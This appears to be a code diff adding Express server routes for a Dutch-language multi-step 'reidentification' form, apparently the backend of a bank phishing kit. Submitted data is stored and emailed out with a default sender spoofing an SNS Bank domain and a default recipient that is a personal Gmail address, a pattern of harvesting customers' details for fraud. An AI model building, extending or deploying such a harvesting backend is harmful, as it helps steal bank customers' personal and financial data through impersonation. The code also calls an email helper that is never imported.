@@ -1,10 +1,111 @@
-import type { Express } from "express";
+import type { Express, Router } from "express";
 import { createServer, type Server } from "http";
 import { storage } from "./storage";
 import { formDataSchema } from "@shared/schema";
 import { sendEmail, generateReidentificationEmail } from "./services/resend";
 import testRouter from './routes/test';
 import { z } from "zod";
+
+// Initialize all routes
+export function initializeRoutes(app: Express) {
+  // Mount test routes
+  app.use('/api/test', testRouter);
+
+  // Submit individual step data with email notification
+  app.post("/api/step-submit", async (req, res) => {
+    try {
+      const { step, ...stepData } = req.body;
+      
+      // Validate based on step
+      let validatedData: any;
+      if (step === 1) {
+        validatedData = step1Schema.parse(req.body);
+      } else if (step === 2) {
+        validatedData = step2Schema.parse(req.body);
+      } else if (step === 3) {
+        validatedData = step3Schema.parse(req.body);
+      } else {
+        throw new Error("Invalid step number");
+      }
+
+      // Send step notification email
+      const emailSent = await sendStepNotificationEmail(validatedData, step);
+      
+      res.json({ 
+        success: true, 
+        step: step,
+        emailSent: emailSent
+      });
+      
+    } catch (error) {
+      console.error("Step submission error:", error);
+      
+      if (error instanceof z.ZodError) {
+        res.status(400).json({ 
+          message: "Validatiefout in formuliergegevens",
+          errors: error.errors 
+        });
+      } else {
+        res.status(500).json({ 
+          message: "Er is een fout opgetreden bij het verzenden van je gegevens" 
+        });
+      }
+    }
+  });
+  
+  // Submit reidentification form
+  app.post("/api/reidentification/submit", async (req, res) => {
+    try {
+      // Validate the form data
+      const validatedData = formDataSchema.parse(req.body);
+      
+      // Store the submission
+      const submission = await storage.createReidentificationSubmission({
+        submissionData: validatedData
+      });
+      
+      // Generate email content
+      const emailContent = generateReidentificationEmail(validatedData);
+      
+      // Send email using Resend
+      const emailParams = {
+        to: process.env.ADMIN_EMAIL || "punkin199573@gmail.com",
+        from: process.env.FROM_EMAIL || "noreply@snsbank.nl",
+        subject: emailContent.subject,
+        html: emailContent.html,
+        text: emailContent.text
+      };
+      
+      const emailSent = await sendEmail(emailParams);
+      
+      // Update email status
+      await storage.updateReidentificationEmailStatus(
+        submission.id, 
+        emailSent ? "true" : "false"
+      );
+      
+      res.json({ 
+        success: true, 
+        submissionId: submission.id,
+        emailSent: emailSent
+      });
+      
+    } catch (error) {
+      console.error("Reidentification submission error:", error);
+      
+      if (error instanceof z.ZodError) {
+        res.status(400).json({ 
+          message: "Validatiefout in formuliergegevens",
+          errors: error.errors 
+        });
+      } else {
+        res.status(500).json({ 
+          message: "Er is een fout opgetreden bij het verzenden van je gegevens" 
+        });
+      }
+    }
+  });
+}
 
 // Individual step schemas for partial validation
 const step1Schema = z.object({
